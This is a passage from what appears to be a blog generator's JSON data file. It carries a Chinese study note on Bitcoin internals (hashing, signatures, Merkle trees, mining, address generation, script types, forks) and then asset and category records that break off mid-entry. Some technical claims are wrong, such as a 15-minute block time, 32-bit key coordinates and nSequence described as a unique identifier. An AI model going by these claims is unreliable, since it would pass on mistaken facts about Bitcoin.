title=\"b.使用途径\"></a>b.使用途径</h3><ul>\n<li>产生公钥。</li>\n<li>交易进行哈希。</li>\n<li>默克尔树生成。</li>\n<li>跟哈希的生成与验证。</li>\n<li>区块的哈希作为下一个区块的输入，验证区块是否合法。</li>\n</ul>\n<h2 id=\"2-非对称加解密\"><a href=\"#2-非对称加解密\" class=\"headerlink\" title=\"2.非对称加解密\"></a>2.非对称加解密</h2><h3 id=\"a-使用的算法\"><a href=\"#a-使用的算法\" class=\"headerlink\" title=\"a.使用的算法\"></a>a.使用的算法</h3><ul>\n<li>ECDSA</li>\n</ul>\n<h3 id=\"b-使用的途径\"><a href=\"#b-使用的途径\" class=\"headerlink\" title=\"b.使用的途径\"></a>b.使用的途径</h3><ul>\n<li>公钥生成。</li>\n<li>签名，用于脚本的验证，确保花费区块时的合法性。</li>\n<li>验证交易的来源是否合法，对于交易需要进行签名,其中公钥与签名都会放在区块中。</li>\n</ul>\n<h2 id=\"3-哈希链表\"><a href=\"#3-哈希链表\" class=\"headerlink\" title=\"3.哈希链表\"></a>3.哈希链表</h2><p>通过前一个区块的哈希进行作为本次区块计算哈希值的一个输入进行计算本次区块的哈希值。</p>\n<h2 id=\"4-默克尔树\"><a href=\"#4-默克尔树\" class=\"headerlink\" title=\"4.默克尔树\"></a>4.默克尔树</h2><p>通过对于交易进行两两哈希，生成默克尔树，最终生成一个跟哈希值，可以通过全节点提供的某个交易的根哈希路径上的交易哈希可以判断交易是否合法。</p>\n<h1 id=\"二-区块与交易信息\"><a href=\"#二-区块与交易信息\" class=\"headerlink\" title=\"二.区块与交易信息\"></a>二.区块与交易信息</h1><h2 id=\"1-区块信息\"><a href=\"#1-区块信息\" class=\"headerlink\" title=\"1.区块信息\"></a>1.区块信息</h2><p><img src=\"/./pic/Pasted%20image%2020240807150054.png\"></p>\n<ul>\n<li>855743：区块高度即为当前区块在公链中的第几个。</li>\n<li>时间：区块产生的时间。</li>\n<li>大小：区块的大小。</li>\n<li>交易费：所有交易的交易费用。</li>\n<li>确认数：本条链后有几个块。</li>\n<li>转账总金额：交易所有的转账金额的总和。</li>\n<li>挖矿难度。</li>\n<li>交易数：交易数量。</li>\n<li>上一个区块：上一个区块的哈希值，形成一个链式结构。</li>\n<li>默克尔树根哈希：交易的默克尔树的跟哈希。</li>\n<li>coinbase：铸币用户，可以随意写，币是凭空产生的，在输出中写对就行。</li>\n</ul>\n<h2 id=\"2-交易信息\"><a href=\"#2-交易信息\" class=\"headerlink\" title=\"2.交易信息\"></a>2.交易信息</h2><h3 id=\"a-铸币交易\"><a href=\"#a-铸币交易\" class=\"headerlink\" title=\"a.铸币交易\"></a>a.铸币交易</h3><p><img src=\"/./pic/Pasted%20image%2020240807151207.png\"></p>\n<ul>\n<li>coinbase：可以随意写。</li>\n<li>输入地址为随意可修改的信息。</li>\n<li>输出地址为获得记账权的账户。</li>\n<li>输出的总金额为本区块的交易费与铸币奖励的总和。</li>\n<li>本次交易没有交易费用。</li>\n</ul>\n<h3 id=\"b-普通交易\"><a href=\"#b-普通交易\" class=\"headerlink\" title=\"b.普通交易\"></a>b.普通交易</h3><p><img src=\"/./pic/Pasted%20image%2020240807151713.png\"></p>\n<ul>\n<li>wintness：签名+公钥地址。</li>\n<li>nSequence：交易的唯一标志，防止重放攻击。</li>\n<li>类型：交易脚本的类型。</li>\n<li>ScriptPubKey：交易的公钥地址。</li>\n</ul>\n<h1 id=\"三-区块共识实现与挖矿\"><a href=\"#三-区块共识实现与挖矿\" class=\"headerlink\" title=\"三.区块共识实现与挖矿\"></a>三.区块共识实现与挖矿</h1><h2 id=\"1-区块共识\"><a href=\"#1-区块共识\" class=\"headerlink\" title=\"1.区块共识\"></a>1.区块共识</h2><h3 id=\"a-实现方式\"><a href=\"#a-实现方式\" class=\"headerlink\" title=\"a.实现方式\"></a>a.实现方式</h3><p>通过算力实现对于区块的写入，算力越强，尝试的nonce次数越多，就越有可能获取到写入区块的能力，算是基于工作量证明的方式。</p>\n<h2 id=\"2-挖矿\"><a href=\"#2-挖矿\" class=\"headerlink\" title=\"2.挖矿\"></a>2.挖矿</h2><p>介绍：即通过对于交易的组合与区块中某些可修改进行进行调整，从而获取满足目标值的哈希值，才能够获取记账权，从而进行区块上链。</p>\n<h3 id=\"a-基本原理\"><a href=\"#a-基本原理\" class=\"headerlink\" title=\"a.基本原理\"></a>a.基本原理</h3><ul>\n<li>通过对于交易的组合哈希与可修改的数据进行修改，生成一个去区块的哈希，以满足最终的目标值的满足条件。</li>\n<li>每次尝试的结果都是一样的，因为哈希计算没有什么相关性。</li>\n<li>算力强的节点，也只是进行的次数比较多才能够有更高的获得记账权的可能。</li>\n</ul>\n<h3 id=\"b-可调整的数值\"><a href=\"#b-可调整的数值\" class=\"headerlink\" title=\"b.可调整的数值\"></a>b.可调整的数值</h3><p>说明：根据上述2.1与2.2.a中的信息可以获取相关的详细信息。</p>\n<ul>\n<li>交易的重组生成的默克尔树的跟哈希不同。</li>\n<li>时间可以在秒级的范围进行微调，以为比特币的出块时间为15分钟大约。</li>\n<li>nonce：随机值，是主要的调整的方式。</li>\n<li>铸币交易的输入信息：不会进行信息验证，可以在需要的情况下进行随机写入信息。</li>\n<li>铸币交易的输出信息：只要不转币，可以对于输出账户进行随意写入，或者写入需要的信息。</li>\n</ul>\n<h3 id=\"c-挖矿\"><a href=\"#c-挖矿\" class=\"headerlink\" title=\"c.挖矿\"></a>c.挖矿</h3><p>说明：通过调整可变的数值，获取区块的整体哈希值，不断对于可变数值进行随机调整，从而实现目标值的范围，从而获取合法的记账权，区块的哈希值小于等于目标值才是算符合条件的合法区块。</p>\n<h3 id=\"d-区块发布\"><a href=\"#d-区块发布\" class=\"headerlink\" title=\"d.区块发布\"></a>d.区块发布</h3><p>说明：对于所有的交易先进行脚本执行，确认交易的合法性</p>\n<h2 id=\"3-难度调整\"><a href=\"#3-难度调整\" class=\"headerlink\" title=\"3.难度调整\"></a>3.难度调整</h2><ul>\n<li>每2016个区块进行一次难度调整，即2周左右调整一次。</li>\n<li>一般的出块时间都在15分钟左右。</li>\n<li>区块哈希 &lt;&#x3D; 目标值为合法</li>\n<li>difficult &#x3D; difficult * target_time&#x2F;real_time</li>\n<li>target &#x3D; target * real_time&#x2F;target_time</li>\n</ul>\n<h1 id=\"四-账户与交易\"><a href=\"#四-账户与交易\" class=\"headerlink\" title=\"四.账户与交易\"></a>四.账户与交易</h1><h2 id=\"1-账户生成\"><a href=\"#1-账户生成\" class=\"headerlink\" title=\"1.账户生成\"></a>1.账户生成</h2><h3 id=\"a-私钥生成\"><a href=\"#a-私钥生成\" class=\"headerlink\" title=\"a.私钥生成\"></a>a.私钥生成</h3><ul>\n<li>获取256bit的随机值，即为32字节的随机值作为哈希值。</li>\n</ul>\n<h3 id=\"b-公钥生成\"><a href=\"#b-公钥生成\" class=\"headerlink\" title=\"b.公钥生成\"></a>b.公钥生成</h3><ul>\n<li>根据私钥进行点乘法，获取目标点。</li>\n<li>非压缩格式开头为为0x04。</li>\n<li>加上x的32bit与y的32bit，为65位。</li>\n<li>压缩格式只存储x32bit的数值。</li>\n<li>前缀表示y的奇偶性质。</li>\n<li>0x02为偶，0x03为奇。</li>\n</ul>\n<h3 id=\"c-地址生成\"><a href=\"#c-地址生成\" class=\"headerlink\" title=\"c.地址生成\"></a>c.地址生成</h3><ul>\n<li>对于公钥进行第一次SHA-256。</li>\n<li>在进行一次RIPEMD-160哈希，获取20字节的数值。</li>\n<li>在加上前缀0x00表示在主网的地址。</li>\n<li>把前缀加20字节数值一起进行2次SHA-256,去前4个字节最为校验值。</li>\n<li>原地址 &#x3D; 前缀 + 20字节的数值 + 校验值</li>\n<li>1+20+4 &#x3D; 25字节</li>\n<li>目标地址为原地址进行base58编码。</li>\n</ul>\n<h2 id=\"2-交易进行原理\"><a href=\"#2-交易进行原理\" class=\"headerlink\" title=\"2.交易进行原理\"></a>2.交易进行原理</h2><p>说明：比特币也是基于交易的状态机，在每个全节点都会有一个UTXO集合，即为未花费交易的输出。交易主要是通过对于指定账户进行转账，其中有锁定脚本，每次使用比特币消费，都必须进行脚本的验证，并且指定比特币的来源，脚本验证通过才可以进行花费，一般脚本都是要进行身份验证，以获取合法的权限进行交易。<br> <img src=\"/./pic/Pasted%20image%2020240807151713.png\"></p>\n<ul>\n<li>其中的类型即为交易脚本类型。</li>\n<li>脚本公钥为，下次交易的公钥，即为输出值地址的公钥,可通过公钥的哈希值，计算出账户。</li>\n<li>类型：即为脚本的类型。</li>\n</ul>\n<h2 id=\"3-交易脚本验证的不同类型\"><a href=\"#3-交易脚本验证的不同类型\" class=\"headerlink\" title=\"3.交易脚本验证的不同类型\"></a>3.交易脚本验证的不同类型</h2><p>说明：交易验证是通过进行本次交易脚本的输入脚本作为前者，要花费的交易的输出脚本作为后者，然后对与脚本进行执行，执行通过，则说明交易合法，执行不通过则说明交易不合法，不予上链，其中脚本执行时用栈的形式进行执行的，其中脚本类型有几种 P2PK、P2PKH、P2SH。</p>\n<h3 id=\"a-P2PK-Pay-to-Public-Key\"><a href=\"#a-P2PK-Pay-to-Public-Key\" class=\"headerlink\" title=\"a.P2PK(Pay to Public Key)\"></a>a.P2PK(Pay to Public Key)</h3><ul>\n<li>输入脚本：PUSHDATA(Sig)</li>\n<li>输出脚本1：PUSHDATA(Public Key)</li>\n<li>输出脚本2：CHECKSIG</li>\n</ul>\n<p>执行：执行脚本时，先对本次交易的签名进行输入，然后获取输出脚本的公钥，对于本次交易进行验证，因为本次交易的发起者为拥有上次交易输出公钥的地址，对本次交易进行私钥签名，通过对于本次交易进行摘要，然后进行与公钥进行相关的EDSA计算，验证输入签名是否合法，合法则脚本执行通过。</p>\n<h3 id=\"b-P2PKH-Pay-to-Public-Key-Hash\"><a href=\"#b-P2PKH-Pay-to-Public-Key-Hash\" class=\"headerlink\" title=\"b.P2PKH(Pay to Public Key Hash)\"></a>b.P2PKH(Pay to Public Key Hash)</h3><ul>\n<li>输入脚本1：PUSHDATA(Sig)</li>\n<li>输入脚本2：PUSHDATA(Public Key)</li>\n<li>输出脚本1：DUP(复制操作)</li>\n<li>输出脚本2：HASH-160</li>\n<li>输出脚本3：PUSHDATA(Public Key Hash)</li>\n<li>输出脚本4：EQUALVERIFY</li>\n<li>输出脚本5：CHECKSIG<br>执行：首先将Sig与Public Key先后入栈，复制Public key的值入栈，然后对于栈顶的Public Key进行HASH-160的计算，然后把输出脚本的Public Key Hash值入栈，然后出栈两个元素进行相等比较，一个是刚入栈的公钥哈希，一个是计算的公钥哈希，验证成功进行公钥与签名的验证。</li>\n</ul>\n<h3 id=\"c-P2SH-Pay-to-Script-Hash\"><a href=\"#c-P2SH-Pay-to-Script-Hash\" class=\"headerlink\" title=\"c.P2SH(Pay to Script Hash)\"></a>c.P2SH(Pay to Script Hash)</h3><ul>\n<li>输入脚本：…………</li>\n<li>输入脚本：PUSHDATA(Sig)</li>\n<li>输入脚本：PUSHDATA(Serialized redeemScript)</li>\n<li>输出脚本：HASH-160</li>\n<li>输出脚本：PUSHDATA(redeemScript HASH)</li>\n<li>输出脚本：EQUAL<br>执行：先执行外步骤，判断脚本是否相同，再进行执行脚本内的操作执行，其中两步的验证操作是在同一个栈上进行的。</li>\n</ul>\n<h3 id=\"d-P2SH实现P2PK\"><a href=\"#d-P2SH实现P2PK\" class=\"headerlink\" title=\"d.P2SH实现P2PK\"></a>d.P2SH实现P2PK</h3><ul>\n<li>脚本的框架还是上述的P2PSH的，只是序列化赎回脚本内容写入了。</li>\n<li>PUSHDATA(Public Key)</li>\n<li>CHECKSIG</li>\n</ul>\n<p>执行：先进行基本的外循环执行，然后成功之后，栈中只留下了Sig，执行赎回脚本，放入Public Key,然后判断签名是否合法。</p>\n<h3 id=\"e-P2SH实现多重签名\"><a href=\"#e-P2SH实现多重签名\" class=\"headerlink\" title=\"e.P2SH实现多重签名\"></a>e.P2SH实现多重签名</h3><h4 id=\"普通的多重签名\"><a href=\"#普通的多重签名\" class=\"headerlink\" title=\"普通的多重签名\"></a>普通的多重签名</h4><p><img src=\"/./pic/Pasted%20image%2020240722231809.png\"></p>\n<ul>\n<li>其中的红色叉子是脚本的逻辑问题，最终会多弹出一个数值。</li>\n</ul>\n<h4 id=\"P2SH实现多重签名\"><a href=\"#P2SH实现多重签名\" class=\"headerlink\" title=\"P2SH实现多重签名\"></a>P2SH实现多重签名</h4><ul>\n<li>输入脚本：Sig1</li>\n<li>输入脚本：Sig2</li>\n<li>输入脚本：Sig3</li>\n<li>输入脚本：序列化的赎回脚本。</li>\n<li>输出脚本：HASH-160</li>\n<li>输出脚本：脚本哈希。</li>\n<li>输出脚本：判断哈希是否相等。</li>\n<li>赎回脚本：M</li>\n<li>赎回脚本：Pubkey1</li>\n<li>赎回脚本：Pubkey2</li>\n<li>赎回脚本： PubKey3</li>\n<li>赎回脚本：N<br>执行：按顺序执行，其中M为拥有M个合法的的公钥就行，N为所有签名的公钥数量总和。</li>\n</ul>\n<h3 id=\"f-Proof-of-Burn\"><a href=\"#f-Proof-of-Burn\" class=\"headerlink\" title=\"f.Proof of Burn\"></a>f.Proof of Burn</h3><p><img src=\"/./pic/Pasted%20image%2020240722233216.png\"></p>\n<ul>\n<li>return之后的代码都不会进行存储。</li>\n<li>用来销毁比特币，这个币永远不能正确验证。</li>\n<li>销毁以获取小币种的加密货币，AltCoin。</li>\n<li>进行永久数据的存储。</li>\n<li>coinbase也可以进行随意的写入，但是需要有区块的记账权。</li>\n</ul>\n<h1 id=\"五-分叉\"><a href=\"#五-分叉\" class=\"headerlink\" title=\"五.分叉\"></a>五.分叉</h1><h2 id=\"1-原因\"><a href=\"#1-原因\" class=\"headerlink\" title=\"1.原因\"></a>1.原因</h2><ul>\n<li>同时获取合法区块。</li>\n<li>对于交易有分歧。</li>\n<li>恶意的节点进行分叉攻击，区块是合法的，用来不正当竞争。</li>\n<li>回滚交易，使得已经发布的交易无效。</li>\n</ul>\n<h2 id=\"2-分叉类型\"><a href=\"#2-分叉类型\" class=\"headerlink\" title=\"2.分叉类型\"></a>2.分叉类型</h2><h3 id=\"a-软分叉\"><a href=\"#a-软分叉\" class=\"headerlink\" title=\"a.软分叉\"></a>a.软分叉</h3><ul>\n<li>旧节点认新区块，新节点不认旧区块。</li>\n<li>旧认新，新不认旧。</li>\n<li>改变区块限制1M–&gt;0.5M.</li>\n</ul>\n<h3 id=\"b-硬分叉\"><a href=\"#b-硬分叉\" class=\"headerlink\" title=\"b.硬分叉\"></a>b.硬分叉</h3><ul>\n<li>旧节点不认的区块，新节点认。</li>\n<li>新认旧，旧不认新。</li>\n<li>改变区块大小限制由1M–&gt;4M。</li>\n</ul>\n"}],"PostAsset":[{"_id":"source/_posts/BlockChain/Road/pic/1.png","slug":"d\\pic\\1.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/10.png","slug":"d\\pic\\10.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/11.png","slug":"d\\pic\\11.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/13.png","slug":"d\\pic\\13.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/14.png","slug":"d\\pic\\14.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/12.png","slug":"d\\pic\\12.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/2.png","slug":"d\\pic\\2.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/3.png","slug":"d\\pic\\3.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/4.png","slug":"d\\pic\\4.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/5.png","slug":"d\\pic\\5.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/6.png","slug":"d\\pic\\6.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/7.png","slug":"d\\pic\\7.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/8.png","slug":"d\\pic\\8.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/9.png","slug":"d\\pic\\9.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/image-20240512233007556.png","slug":"d\\pic\\image-20240512233007556.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/Road/pic/image-20240512233135377.png","slug":"d\\pic\\image-20240512233135377.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/ETH/pic/Pasted image 20240722231809.png","slug":"\\pic\\Pasted image 20240722231809.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/ETH/pic/Pasted image 20240807150054.png","slug":"\\pic\\Pasted image 20240807150054.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/ETH/pic/Pasted image 20240722233216.png","slug":"\\pic\\Pasted image 20240722233216.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/ETH/pic/Pasted image 20240807151713.png","slug":"\\pic\\Pasted image 20240807151713.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0},{"_id":"source/_posts/BlockChain/ETH/pic/Pasted image 20240807151207.png","slug":"\\pic\\Pasted image 20240807151207.png","post":"clz7mrmjm00018wunhspdg6wn","modified":0,"renderable":0}],"PostCategory":[{"post_id":"clz7mrmjy000l8wung6bifeqa","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmk1000v8wun2ypi05j4"},{"post_id":"clz7mrmjy000l8wung6bifeqa","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clz7mrmk200108wunep1jadqo"},{"post_id":"clz7mrmjs00078wunalxqac9h","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmk300138wun64m2hnae"},{"post_id":"clz7mrmjs00078wunalxqac9h","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clz7mrmk400188wunfhwjhj5l"},{"post_id":"clz7mrmjz000n8wun0ci33yap","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmk4001b8wun9uauavgr"},{"post_id":"clz7mrmjz000n8wun0ci33yap","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clz7mrmk6001g8wun9yev26my"},{"post_id":"clz7mrmk0000r8wun9muh25tl","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmk6001j8wunhvi2b7fy"},{"post_id":"clz7mrmk0000r8wun9muh25tl","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clz7mrmk7001n8wun1b7xepdu"},{"post_id":"clz7mrmjm00018wunhspdg6wn","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmk7001p8wun676shc0i"},{"post_id":"clz7mrmjm00018wunhspdg6wn","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clz7mrmk7001t8wunbheiftl5"},{"post_id":"clz7mrmk1000t8wunf78x90u1","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmk7001v8wun9vg12phn"},{"post_id":"clz7mrmk1000t8wunf78x90u1","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clz7mrmk8001z8wun5igk6ovf"},{"post_id":"clz7mrmk2000y8wun9vt7bvp7","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmk800218wun7z8v3aa0"},{"post_id":"clz7mrmk2000y8wun9vt7bvp7","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clz7mrmk800258wun1r40455q"},{"post_id":"clz7mrmjs00088wun506p359v","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmk800278wungj1i91is"},{"post_id":"clz7mrmjs00088wun506p359v","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clz7mrmk9002b8wun4hx7divc"},{"post_id":"clz7mrmk200118wungvif75p0","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmk9002d8wundfd0549d"},{"post_id":"clz7mrmk200118wungvif75p0","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clz7mrmk9002h8wun05720cnn"},{"post_id":"clz7mrmk300168wune9g57jzv","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmka002j8wungrux5i4x"},{"post_id":"clz7mrmk300168wune9g57jzv","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clz7mrmka002m8wun0zxk5flr"},{"post_id":"clz7mrmju000b8wungz0jbjk0","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmka002o8wun40oac036"},{"post_id":"clz7mrmju000b8wungz0jbjk0","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clz7mrmka002r8wun11labh1w"},{"post_id":"clz7mrmjo00038wunhibl6t3w","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmka002t8wun687d9zq4"},{"post_id":"clz7mrmjo00038wunhibl6t3w","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clz7mrmka002v8wun18xf1q6v"},{"post_id":"clz7mrmjv000c8wun9406chp4","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmkb002y8wunfuq649wq"},{"post_id":"clz7mrmjv000c8wun9406chp4","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clz7mrmkb00308wun4jtq0l6c"},{"post_id":"clz7mrmjw000f8wun2ahee70y","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmkb00338wunecupcp5v"},{"post_id":"clz7mrmjw000f8wun2ahee70y","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clz7mrmkb00358wun748n72fp"},{"post_id":"clz7mrmjr00068wun88hh96q1","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmkb00378wun747f5enc"},{"post_id":"clz7mrmjr00068wun88hh96q1","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clz7mrmkb00398wun8mas9n01"},{"post_id":"clz7mrmjx000h8wun6pkp6d1c","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz7mrmkb003a8wunddmkhca5"},{"post_id":"clz7mrmjx000h8wun6pkp6d1c","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clz7mrmkb003b8wun2kw44ids"},{"post_id":"clz7mrmk400198wuneq1y19t5","category_id":"clz7mrmk800288wun17ul97vd","_id":"clz7mrmkb003c8wune2q2bnr6"},{"post_id":"clz7mrmk400198wuneq1y19t5","category_id":"clz7mrmka002p8wun7lsecehb","_id":"clz7mrmkc003d8wung2mrfrn2"},{"post_id":"clz7mrmk5001e8wunawo84hk9","category_id":"clz7mrmk800288wun17ul97vd","_id":"clz7mrmkc003e8wundyfu5c6q"},{"post_id":"clz7mrmk5001e8wunawo84hk9","category_id":"clz7mrmka002p8wun7lsecehb","_id":"clz7mrmkc003f8wun3oiqhkl6"},{"post_id":"clz8lvt0h0000isundtyc1zql","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz8lvt0t0005isunhxmzdyl3"},{"post_id":"clz8lvt0h0000isundtyc1zql","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clz8lvt0t0007isunhmtqhg2n"},{"post_id":"clz8lvt0r0002isun9gvmetmt","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz8lvt0t0009isungoq7azgw"},{"post_id":"clz8lvt0r0002isun9gvmetmt","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clz8lvt0t000bisunaykz80xf"},{"post_id":"clz8lvt0s0004isunebc50jvr","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clz8lvt0t000disunauaj084q"},{"post_id":"clz8lvt0s0004isunebc50jvr","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clz8lvt0u000eisunfsdr90hy"},{"post_id":"clza14odc000084ungszc1wff","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clza14odf000684un0mbf24w5"},{"post_id":"clza14odc000084ungszc1wff","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clza14odg000884unfbiqe4ih"},{"post_id":"clza14odd000184un9na7518i","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clza14odh000b84unah983g2c"},{"post_id":"clza14odd000184un9na7518i","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clza14odi000e84un5xtz3inc"},{"post_id":"clza14ode000384un14f7e73l","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clza14odi000g84un96m37vep"},{"post_id":"clza14ode000384un14f7e73l","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clza14odi000i84ung41khwxh"},{"post_id":"clza14odf000584un0vfndc9t","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clza14odi000k84unhdrzgwcu"},{"post_id":"clza14odf000584un0vfndc9t","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clza14odj000m84un0orrf7or"},{"post_id":"clza14odg000a84un3wvi3chw","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clza14odj000o84un3s8af4wo"},{"post_id":"clza14odg000a84un3wvi3chw","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clza14odj000q84undgv4avzm"},{"post_id":"clza14odh000d84un050wh05s","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clza14odj000s84un3nf57jag"},{"post_id":"clza14odh000d84un050wh05s","category_id":"clz7mrmk1000w8wun2ca7bimo","_id":"clza14odj000t84un0be7gpko"},{"post_id":"clzbh821600002sundcwrhcyf","category_id":"clz7mrmka002k8wun8ywr3teg","_id":"clzbh821k00072sung6yr1qgl"},{"post_id":"clzbh821600002sundcwrhcyf","category_id":"clz7mrmkb00318wun5u1sduq2","_id":"clzbh821m00092suncpi8cyf3"},{"post_id":"clzbh821l00082sune5oc8lrr","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clzbh821q000i2sun4lle2zip"},{"post_id":"clzbh821l00082sune5oc8lrr","category_id":"clzbh821j00062sunb9sea6p4","_id":"clzbh821r000m2suncm7kgv7f"},{"post_id":"clzbh821c00012sun8lhg3dra","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clzbh821s000p2sun4f5x55in"},{"post_id":"clzbh821c00012sun8lhg3dra","category_id":"clzbh821j00062sunb9sea6p4","_id":"clzbh821s000r2sun0sw57gbg"},{"post_id":"clzbh821m000a2sunffek0ri9","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clzbh821t000t2sun0qekcvel"},{"post_id":"clzbh821m000a2sunffek0ri9","category_id":"clzbh821j00062sunb9sea6p4","_id":"clzbh821t000v2sun6poqdux8"},{"post_id":"clzbh821o000e2sunfz46epd7","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clzbh821t000x2sun5jtg4u4t"},{"post_id":"clzbh821o000e2sunfz46epd7","category_id":"clzbh821j00062sunb9sea6p4","_id":"clzbh821t000z2sunh7jub37w"},{"post_id":"clzbh821e00032sun4x4xe0am","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clzbh821t00112sun1nysc1dj"},{"post_id":"clzbh821e00032sun4x4xe0am","category_id":"clzbh821j00062sunb9sea6p4","_id":"clzbh821t00132sunenek87ea"},{"post_id":"clzbh821p000g2sundurqeh3s","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clzbh821t00152sunht00cwcn"},{"post_id":"clzbh821p000g2sundurqeh3s","category_id":"clzbh821j00062sunb9sea6p4","_id":"clzbh821t00172suncvtkd8cc"},{"post_id":"clzbh821r000l2suneueq2wa7","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clzbh821t00192sun9ix78w6m"},{"post_id":"clzbh821r000l2suneueq2wa7","category_id":"clzbh821j00062sunb9sea6p4","_id":"clzbh821u001b2sund4glfyaz"},{"post_id":"clzbh821i00052sun4p2wc313","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clzbh821u001d2sun4mpd4qz7"},{"post_id":"clzbh821i00052sun4p2wc313","category_id":"clzbh821j00062sunb9sea6p4","_id":"clzbh821u001f2sun79r08bpw"},{"post_id":"clzbh821s000o2sun28qs95e0","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clzbh821u001h2sunhmix3l1f"},{"post_id":"clzbh821s000o2sun28qs95e0","category_id":"clzbh821j00062sunb9sea6p4","_id":"clzbh821u001i2sun4l4b9stu"},{"post_id":"clzju0hn700006suna6v8a1qr","category_id":"clz7mrmjq00048wun040u8kwp","_id":"clzju0hnd00036sunhkx60c4w"},{"post_id":"clzju0hn700006suna6v8a1qr","category_id":"clz7mrmjx000i8wun7cww9qo9","_id":"clzju0hnd00046sunhocn5s8q"}],"PostTag":[{"post_id":"clz7mrmjm00018wunhspdg6wn","tag_id":"clz7mrmjr00058wun664g1l8y","_id":"clz7mrmjw000g8wun7ua24qj4"},{"post_id":"clz7mrmjm00018wunhspdg6wn","tag_id":"clz7mrmjt000a8wunan0ib53j","_id":"clz7mrmjx000j8wuneacd446f"},{"post_id":"clz7mrmjv000c8wun9406chp4","tag_id":"clz7mrmjr00058wun6